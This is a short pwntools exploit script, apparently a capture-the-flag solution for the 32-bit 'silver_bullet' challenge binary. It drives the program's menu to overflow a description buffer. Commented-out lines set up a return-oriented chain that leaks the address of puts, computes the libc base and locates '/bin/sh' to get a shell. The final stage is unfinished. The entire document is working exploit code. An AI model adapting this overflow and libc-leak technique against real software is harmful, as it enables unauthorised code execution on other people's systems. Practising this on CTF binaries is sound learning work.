from pwn import *

elf = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")

p = elf.process()
raw_input("DEBUG")
def create(data):
	p.sendlineafter("Your choice :",b"1")
	p.sendlineafter("Give me your description of bullet :",data)
	
def powerup(data):
	p.sendlineafter("Your choice :",b"2")
	p.sendlineafter("Give me your another description of bullet :",data)
	
def beat():
	p.sendafter("Your choice :",b"3")

create(b"A"*0x2f)
powerup(b"B")

#payload = b"\xff\xff\xff"+b"A"*4
#payload += p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])

#powerup(payload)
#beat()

#p.recvuntil("Oh ! You win !!\n")
#leaked_puts = u32(p.recv(4))
#log.info(hex(leaked_puts))
#libc.address = leaked_puts - libc.sym['puts']
#log.info("LIBC BASE: " + hex(libc.address))
#bin_sh = libc.search("/bin/sh\x00").next()

p.interactive()
